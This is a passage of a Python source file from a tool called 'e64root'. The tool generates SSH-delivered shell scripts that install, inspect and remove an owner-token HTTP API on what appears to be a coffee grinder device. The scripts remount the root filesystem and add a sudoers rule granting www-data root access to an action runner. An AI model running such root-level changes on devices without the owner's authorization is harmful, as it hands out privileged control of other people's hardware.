if ! mv -f "$sudoers_tmp" __E64_SUDOERS_FILE__; then
  echo "e64root api deploy: could not install __E64_SUDOERS_FILE__" >&2
  exit 1
fi
sudoers_tmp=
chmod 0440 __E64_SUDOERS_FILE__
chown root:root __E64_SUDOERS_FILE__ 2>/dev/null || chown root __E64_SUDOERS_FILE__ 2>/dev/null || true
if ! visudo -cf __E64_SUDOERS_FILE__ >/dev/null 2>&1; then
  rm -f __E64_SUDOERS_FILE__
  echo "e64root api deploy: the installed sudoers file did not validate and was removed" >&2
  exit 1
fi

# The installed file must be mode 0440 and hold the marker plus exactly one rule.
sudoers_mode=$(stat -c '%a' __E64_SUDOERS_FILE__ 2>/dev/null || echo unknown)
sudoers_rules=$(grep -cvE '^(#|$)' __E64_SUDOERS_FILE__ 2>/dev/null || true)
if [ "$sudoers_mode" != "440" ] || [ "$sudoers_rules" != "1" ] \\
   || ! grep -qxF '__E64_SUDOERS_RULE__' __E64_SUDOERS_FILE__ 2>/dev/null \\
   || ! grep -qxF '__E64_SUDOERS_MARKER__' __E64_SUDOERS_FILE__ 2>/dev/null; then
  rm -f __E64_SUDOERS_FILE__
  echo "e64root api deploy: the installed sudoers file is not the expected 0440 file with one rule; removed" >&2
  exit 1
fi
echo "sudoers_rule=installed"
echo "sudoers_file=__E64_SUDOERS_FILE__ (mode 0440 root:root)"
"""


def _api_sudoers_block() -> str:
    """Return the deploy script fragment that installs the sudoers rule."""
    return (
        API_SUDOERS_BLOCK
        .replace("__E64_SUDOERS_CONTENT__", _api_sudoers_content())
        .replace("__E64_SUDOERS_RULE__", API_SUDOERS_RULE)
        .replace("__E64_SUDOERS_MARKER__", API_SUDOERS_MARKER)
        .replace("__E64_SUDOERS_FILE__", API_SUDOERS_FILE)
    )


def _api_deploy_script(
    module_path: str,
    token: str | None,
    enable_actions: bool = False,
    destructive: bool = False,
    secret: str | None = None,
) -> str:
    """Build the deploy script for the local API module."""
    from .payloads import _validate_script

    if token is not None:
        token = _check_owner_token(token)
    if destructive and not enable_actions:
        raise UsageError("--enable-destructive-actions requires --enable-actions")

    try:
        module_content = Path(module_path).read_text(encoding="utf-8")
    except OSError as exc:
        raise UsageError(f"cannot read API module {module_path}: {exc}") from exc

    token_block = ""
    if token is not None:
        quoted_token = shlex.quote(token)
        token_block = f"""# Write the owner token (mode 0600, owned by www-data)
printf '%s\\n' {quoted_token} > {API_TOKEN_FILE}
chmod 600 {API_TOKEN_FILE}
chown www-data:www-data {API_TOKEN_FILE} 2>/dev/null || chown www-data {API_TOKEN_FILE} 2>/dev/null || true
"""
    else:
        token_block = f"""# Preserve the existing owner token; --enable-actions does not require a
# re-issued token, and silently replacing it would lock clients out.
if [ ! -f {API_TOKEN_FILE} ]; then
  echo "e64root api deploy: no owner token exists; pass --token or --generate-token" >&2
  exit 1
fi
"""

    actions_block = ""
    if enable_actions:
        if secret is None:
            # Preview only.  The emitted script refuses to install this
            # placeholder, so a real --dry-run plan always carries a fresh
            # secret and the gate can never be armed with a known one.
            secret = "<generated at deploy time>"
        policy = json.dumps(_action_policy_document(destructive, secret), indent=2, sort_keys=True)
        destructive_value = "yes" if destructive else "no"
        sudoers_block = _api_sudoers_block()
        actions_block = f"""
# --- Gated action layer -----------------------------------------------------
# The runner is the only process that talks to the WSS command surface or
# writes the machine database on behalf of an action.  It is root-owned.
cat > {API_RUNNER} << 'E64LOCAL_ACTION_RUNNER'
__E64LOCAL_RUNNER_CONTENT__
E64LOCAL_ACTION_RUNNER
chmod 755 {API_RUNNER}
chown root:root {API_RUNNER} 2>/dev/null || chown root {API_RUNNER} 2>/dev/null || true

# The runner's shebang is /usr/bin/env php; verify a PHP CLI exists.
if ! command -v php >/dev/null 2>&1; then
  echo "e64root api deploy: php CLI is required for the action runner" >&2
  exit 1
fi
php -l {API_RUNNER} >/dev/null

{sudoers_block}
# Action state lives under /db/e64local and is writable by the module's user.
mkdir -p {API_ACTION_DIR} {API_RATE_DIR} {API_BACKUP_DIR}
chmod 700 {API_ACTION_DIR} {API_RATE_DIR} {API_BACKUP_DIR}
chown www-data:www-data {API_ACTION_DIR} {API_RATE_DIR} {API_BACKUP_DIR} 2>/dev/null || true
# Rate-limit buckets hold monotonic timestamps.  A bucket from another boot is
# treated as a fresh window, but one written by the pre-monotonic release is
# refused outright, so a re-deploy clears them.
rm -f {API_RATE_DIR}/*.json
if [ ! -f {API_AUDIT_FILE} ]; then
  : > {API_AUDIT_FILE}
fi
chmod 600 {API_AUDIT_FILE}
chown www-data:www-data {API_AUDIT_FILE} 2>/dev/null || true

# Rewriting the policy generates a new HMAC secret, which invalidates every
# outstanding confirm token.
cat > {API_POLICY_FILE} << 'E64LOCAL_ACTION_POLICY'
{policy}
E64LOCAL_ACTION_POLICY
chmod 600 {API_POLICY_FILE}
chown www-data:www-data {API_POLICY_FILE} 2>/dev/null || true

policy_mode=$(stat -c '%a' {API_POLICY_FILE} 2>/dev/null || echo unknown)
if [ "$policy_mode" != "600" ]; then
  echo "e64root api deploy: action policy mode is $policy_mode, expected 600" >&2
  exit 1
fi
# The policy must carry a real secret: the redacted placeholder is only for a
# printed preview, and shipping it would make the gate refuse every action.
if grep -q '<generated at deploy time>' {API_POLICY_FILE}; then
  echo "e64root api deploy: refusing to install a policy with a placeholder secret" >&2
  exit 1
fi
if [ ! -x {API_RUNNER} ]; then
  echo "e64root api deploy: action runner is not executable" >&2
  exit 1
fi
echo "actions_enabled=yes"
echo "destructive_actions={destructive_value}"
"""
        actions_block = actions_block.replace("__E64LOCAL_RUNNER_CONTENT__", _api_runner_content())

    script = f"""#!/bin/sh
# e64root api deploy (generated locally; owner-authorized use only)
set -eu
umask 077
mount -o remount,rw / 2>/dev/null || true

# Create the dev directory
mkdir -p /usr/local/www/dev

# Write the API module
cat > /usr/local/www/dev/rest_api_dev.php << 'E64LOCAL_API_MODULE'
{module_content}
E64LOCAL_API_MODULE
chmod 644 /usr/local/www/dev/rest_api_dev.php

# Create the token directory. 0711 lets www-data traverse to the token
# without being able to list the directory.
mkdir -p {API_TOKEN_DIR}
chmod 711 {API_TOKEN_DIR}

{token_block}
# Verify the module is readable
if [ ! -r /usr/local/www/dev/rest_api_dev.php ]; then
  echo "e64root api deploy: module is not readable" >&2
  exit 1
fi

# Verify the token file is readable and has the owner-only mode
if [ ! -r {API_TOKEN_FILE} ]; then
  echo "e64root api deploy: token file is not readable" >&2
  exit 1
fi
token_mode=$(stat -c '%a' {API_TOKEN_FILE} 2>/dev/null || echo unknown)
if [ "$token_mode" != "600" ]; then
  echo "e64root api deploy: token file mode is $token_mode, expected 600" >&2
  exit 1
fi

echo "e64root api deploy ok"
echo "module: /usr/local/www/dev/rest_api_dev.php"
echo "token: {API_TOKEN_FILE} (mode 0600)"
{actions_block}"""
    return _validate_script(script)


def _api_runner_content() -> str:
    """Read the bounded runner for embedding in the deploy script."""
    try:
        return Path(_api_runner_path()).read_text(encoding="utf-8").rstrip("\n")
    except OSError as exc:
        raise UsageError(f"cannot read action runner: {exc}") from exc


def _api_sudoers_revert_block() -> str:
    """Return the revert fragment that removes only the marked sudoers file."""
    return f"""# Remove the sudoers rule, but only the file this tool wrote.  A hand-written
# rule at the same path has no marker and is left alone.
if [ -f {API_SUDOERS_FILE} ]; then
  if grep -qxF {shlex.quote(API_SUDOERS_MARKER)} {API_SUDOERS_FILE} 2>/dev/null; then
    rm -f {API_SUDOERS_FILE}
    echo "sudoers_rule=removed"
  else
    echo "sudoers_rule=kept (no e64root marker)"
  fi
else
  echo "sudoers_rule=absent"
fi
"""


def _api_revert_script(purge_audit: bool = False) -> str:
    """Build the revert script for the local API module."""
    from .payloads import _validate_script

    audit_block = ""
    if purge_audit:
        audit_block = f"""
# --purge-audit also removes the action audit trail.
rm -f {API_AUDIT_FILE} {API_AUDIT_FILE}.1 {API_AUDIT_FILE}.2
"""
    sudoers_block = _api_sudoers_revert_block()
    script = f"""#!/bin/sh
# e64root api revert (generated locally; owner-authorized use only)
set -eu
mount -o remount,rw / 2>/dev/null || true

# Remove the API module and the action runner
rm -f /usr/local/www/dev/rest_api_dev.php
rm -f {API_RUNNER}

{sudoers_block}
# Remove the action gate and its working state.  The gate file is what makes
# every action route fail closed; removing it is enough to return to read-only.
rm -f {API_POLICY_FILE}
rm -rf {API_ACTION_DIR} {API_RATE_DIR} {API_BACKUP_DIR}
{audit_block}
# Remove the token file
rm -f {API_TOKEN_FILE}

# Remove the token directory if empty
rmdir {API_TOKEN_DIR} 2>/dev/null || true

echo "e64root api revert ok"
echo "actions_enabled=no"
"""
    return _validate_script(script)


API_STATUS_SCRIPT = """#!/bin/sh
# e64root api status (read-only)
set -u

# Check module
if [ -f /usr/local/www/dev/rest_api_dev.php ]; then
  module_sha256=$(sha256sum /usr/local/www/dev/rest_api_dev.php 2>/dev/null | cut -d' ' -f1)
  module_size=$(stat -c '%s' /usr/local/www/dev/rest_api_dev.php 2>/dev/null || echo unknown)
  echo "module_present=yes"
  echo "module_path=/usr/local/www/dev/rest_api_dev.php"
  echo "module_size=${module_size}"
  echo "module_sha256=${module_sha256}"
else
  echo "module_present=no"
fi

# Check token file
if [ -f __E64_TOKEN_FILE__ ]; then
  token_mode=$(stat -c '%a' __E64_TOKEN_FILE__ 2>/dev/null || echo unknown)
  token_owner=$(stat -c '%U' __E64_TOKEN_FILE__ 2>/dev/null || echo unknown)
  token_group=$(stat -c '%G' __E64_TOKEN_FILE__ 2>/dev/null || echo unknown)
  echo "token_present=yes"
  echo "token_path=__E64_TOKEN_FILE__"
  echo "token_mode=${token_mode}"
  echo "token_owner=${token_owner}"
  echo "token_group=${token_group}"
else
  echo "token_present=no"
fi

# Check the action gate.  The secret is never printed.
if [ -f __E64_POLICY_FILE__ ]; then
  policy_mode=$(stat -c '%a' __E64_POLICY_FILE__ 2>/dev/null || echo unknown)
  echo "actions_policy=yes"
  echo "actions_policy_mode=${policy_mode}"
  if grep -q '"enabled": true' __E64_POLICY_FILE__ 2>/dev/null; then
    echo "actions_enabled=yes"
  else
    echo "actions_enabled=no"
  fi
  if grep -q '"destructiveEnabled": true' __E64_POLICY_FILE__ 2>/dev/null; then
    echo "actions_destructive=yes"
  else
    echo "actions_destructive=no"
  fi
else
  echo "actions_policy=no"
  echo "actions_enabled=no"
  echo "actions_destructive=no"
fi

# Check the bounded runner
if [ -f __E64_RUNNER__ ]; then
  runner_mode=$(stat -c '%a' __E64_RUNNER__ 2>/dev/null || echo unknown)
  runner_sha256=$(sha256sum __E64_RUNNER__ 2>/dev/null | cut -d' ' -f1)
  echo "action_runner_present=yes"
  echo "action_runner_mode=${runner_mode}"
  echo "action_runner_sha256=${runner_sha256}"
else
  echo "action_runner_present=no"
fi

# Check the audit trail
if [ -f __E64_AUDIT_FILE__ ]; then
  echo "action_audit_present=yes"
  echo "action_audit_bytes=$(stat -c '%s' __E64_AUDIT_FILE__ 2>/dev/null || echo unknown)"
else
  echo "action_audit_present=no"
fi

# Check the sudoers rule that lets www-data start the runner.  Without any
# such rule every action fails with 503 even when the gate is enabled.
if [ -f __E64_SUDOERS_FILE__ ]; then
  sudoers_mode=$(stat -c '%a' __E64_SUDOERS_FILE__ 2>/dev/null || echo unknown)
  sudoers_owner=$(stat -c '%U' __E64_SUDOERS_FILE__ 2>/dev/null || echo unknown)
  echo "sudoers_present=yes"
  echo "sudoers_path=__E64_SUDOERS_FILE__"
  echo "sudoers_mode=${sudoers_mode}"
  echo "sudoers_owner=${sudoers_owner}"
  if grep -qxF '__E64_SUDOERS_RULE__' __E64_SUDOERS_FILE__ 2>/dev/null; then
    echo "sudoers_rule=present"
  else
    echo "sudoers_rule=missing"
  fi
  if command -v visudo >/dev/null 2>&1; then
    if visudo -cf __E64_SUDOERS_FILE__ >/dev/null 2>&1; then
      echo "sudoers_valid=yes"
    else
      echo "sudoers_valid=no"
    fi
  else
    echo "sudoers_valid=unknown"
  fi
else
  echo "sudoers_present=no"
  echo "sudoers_rule=missing"
  echo "sudoers_valid=no"
fi

# Check dev mode
if [ -f /etc/issue ]; then
  first_word=$(head -n1 /etc/issue | awk '{print tolower($1)}')
  if [ "${first_word}" = "development" ]; then
    echo "dev_mode=yes"
  else
    echo "dev_mode=no"
  fi
else
  echo "dev_mode=unknown"
fi
"""


def _api_status_script() -> str:
    """Build the status script for the local API module."""
    from .payloads import _validate_script

    script = (
        API_STATUS_SCRIPT
        .replace("__E64_TOKEN_FILE__", API_TOKEN_FILE)
        .replace("__E64_POLICY_FILE__", API_POLICY_FILE)
        .replace("__E64_RUNNER__", API_RUNNER)
        .replace("__E64_AUDIT_FILE__", API_AUDIT_FILE)
        .replace("__E64_SUDOERS_RULE__", API_SUDOERS_RULE)
        .replace("__E64_SUDOERS_FILE__", API_SUDOERS_FILE)
    )
    return _validate_script(script)


def cmd_api(args: Any, ssh: SSHTransport | None = None) -> int:
    """Deploy, verify, or remove the local owner HTTP API module."""

    enable_actions = bool(getattr(args, "enable_actions", False))
    destructive = bool(getattr(args, "enable_destructive_actions", False))
    purge_audit = bool(getattr(args, "purge_audit", False))
    if destructive and not enable_actions:
        raise UsageError("--enable-destructive-actions requires --enable-actions")

    if args.dry_run:
        if args.api_subcommand == "deploy":
            if not args.token and not args.generate_token and not enable_actions:
                raise UsageError("--token or --generate-token is required for api deploy")
            module_path = _api_module_path()
            token = "<generated at deploy time>" if args.generate_token else args.token
            print(f"e64root {__version__} api deploy --dry-run (no device contact)")
            print(f"target: {args.host}")
            print(f"module: {module_path}")
            print(f"token: {'<preserved>' if token is None else token}")
            if enable_actions:
                print(f"actions: enabled (destructive={'yes' if destructive else 'no'})")
                print("action policy: /db/e64local/actions.json (secret generated at deploy time)")
                print(f"sudoers file: {API_SUDOERS_FILE} (mode 0440, root:root, validated with visudo -cf)")
                print("--- begin exact content of " + API_SUDOERS_FILE + " ---")
                print(_api_sudoers_content(), end="")
                print("--- end exact content of " + API_SUDOERS_FILE + " ---")
            script = _api_deploy_script(
                module_path,
                token,
                enable_actions=enable_actions,
                destructive=destructive,
                # A plan must be honest: the real command generates a fresh
                # secret, and the script refuses to install a placeholder one.
                secret=secrets.token_hex(32) if enable_actions else None,
            )
            _print_plan("API deploy script that would be sent", _redact_script_secrets(script))
            return 0
        elif args.api_subcommand == "revert":
            script = _api_revert_script(purge_audit=purge_audit)
            print(f"e64root {__version__} api revert --dry-run (no device contact)")
            print(f"target: {args.host}")
            _print_plan("API revert script that would be sent", script)
            return 0
        else:
            script = _api_status_script()
            print(f"e64root {__version__} api status --dry-run (no device contact)")
            print(f"target: {args.host}")
            _print_plan("API status script that would be sent", script)
            return 0

    # Refuse a device-changing deploy before opening any transport.
    if args.api_subcommand == "deploy":
        _require_change(args, "local API module deploy")
        if not args.token and not args.generate_token and not enable_actions:
            raise UsageError("--token or --generate-token is required for api deploy")

    ssh = ssh or _make_ssh(args)
    ssh.wait_ready(timeout=args.ssh_wait)

    if args.api_subcommand == "deploy":
        module_path = _api_module_path()
        token = args.token
        if args.generate_token:
            token = secrets.token_hex(32)
            print(f"generated token: {token}")

        # A fresh 256-bit HMAC key per deploy.  It is sent to the device inside
        # the policy file but never printed: _redact_script_secrets() hides it.
        action_secret = secrets.token_hex(32) if enable_actions else None
        script = _api_deploy_script(
            module_path,
            token,
            enable_actions=enable_actions,
            destructive=destructive,
            secret=action_secret,
        )
        print(f"e64root {__version__} api deploy")
        print(f"target: {args.host}")
        print(f"module: {module_path}")
        _print_plan("API deploy script being sent", _redact_script_secrets(script))

        result = ssh.run(script)
        print("\nobserved:")
        print(result.stdout.rstrip())
        if result.stderr:
            print(result.stderr.rstrip(), file=sys.stderr)
        if result.returncode != 0:
            raise TransportError(f"api deploy exited {result.returncode}")

        print("\nLocal API v1 is now installed. Read-only routes: capabilities, machine,")
        print("grind_log, service_log, alert_log, portafilters, recipes, settings,")
        print("config, file, ws_token")
        print("All routes require the owner token via X-E64-Local-Token header.")
        if enable_actions:
            print("\nAction layer is ENABLED:")
            print("  gate:        /db/e64local/actions.json (mode 0600)")
            print("  runner:      " + API_RUNNER)
            print("  sudoers:     " + API_SUDOERS_FILE + " (mode 0440, one rule, validated)")
            print("  audit:       " + API_AUDIT_FILE)
            print(f"  destructive: {'yes' if destructive else 'no'}")
            print("  protocol:    action_prepare -> action_execute")
            if destructive:
                print("  destructive actions are gated behind this deploy flag only.")
            else:
                print("  destructive actions fail closed with errorCode 403.")
        else:
            print("\nAction routes are not enabled; every action route returns 403.")
            print("Re-deploy with --enable-actions to enable the gated control surface.")
        return 0

    elif args.api_subcommand == "status":
        script = _api_status_script()
        print(f"e64root {__version__} api status")
        print(f"target: {args.host}")

        result = ssh.run(script)
        if result.returncode != 0:
            raise TransportError(f"api status exited {result.returncode}")
        values = parse_kv(result.stdout)
        print("\nstatus:")
        for key in (
            "module_present",
            "module_path",
            "module_size",
            "module_sha256",
            "token_present",
            "token_path",
            "token_mode",
            "token_owner",
            "token_group",
            "actions_policy",
            "actions_policy_mode",
            "actions_enabled",
            "actions_destructive",
            "action_runner_present",
            "action_runner_mode",
            "action_runner_sha256",
            "sudoers_present",
            "sudoers_path",
            "sudoers_mode",
            "sudoers_owner",
            "sudoers_rule",
            "sudoers_valid",
            "action_audit_present",
            "action_audit_bytes",
            "dev_mode",
        ):
            value = values.get(key, "unknown")
            print(f"  {key:22s} {value}")

        if values.get("module_present") == "yes" and values.get("token_present") == "yes":
            print("\nLocal API v1 is installed and configured.")
        elif values.get("module_present") == "yes":
            print("\nLocal API v1 module is installed but token is missing.")
        else:
            print("\nLocal API v1 is not installed.")

        if values.get("actions_enabled") == "yes":
            print("Action layer is enabled (destructive=" + values.get("actions_destructive", "unknown") + ").")
            # The rule is the narrow grant that lets www-data start the runner;
            # without any such rule every action fails with 503 even though the
            # gate is open.
            if values.get("sudoers_rule") != "present":
                print(
                    f"warning: {API_SUDOERS_FILE} is missing or does not carry the rule. "
                    "Actions then work only when another sudo rule already permits "
                    "www-data to run the runner; otherwise they fail with 503. "
                    "Re-run api deploy --enable-actions."
                )
            elif values.get("sudoers_valid", "").startswith("no"):
                print(
                    f"warning: {API_SUDOERS_FILE} is present but fails visudo; "
                    "actions may fail with 503."
                )
        else:
            print("Action layer is disabled; action routes fail closed with 403.")
        return 0

    elif args.api_subcommand == "revert":
        script = _api_revert_script(purge_audit=purge_audit)
        print(f"e64root {__version__} api revert")
        print(f"target: {args.host}")
        _print_plan("API revert script being sent", script)

        if not args.yes:
            print("\ndry run: no changes made. Re-run with --yes to execute.")
            return 0

        result = ssh.run(script)
        print("\nobserved:")
        print(result.stdout.rstrip())
        if result.stderr:
            print(result.stderr.rstrip(), file=sys.stderr)
        if result.returncode != 0:
            raise TransportError(f"api revert exited {result.returncode}")

        print("\nLocal API v1 has been removed.")
        if not purge_audit:
            print("The action audit trail was kept; use --purge-audit to remove it too.")
        return 0

    raise UsageError(f"unknown api subcommand: {args.api_subcommand}")


__all__ = [
    "cmd_api",
    "cmd_probe",
    "cmd_web",
    "cmd_esp",
    "cmd_ssh",
    "cmd_verify",
    "cmd_revert",
]
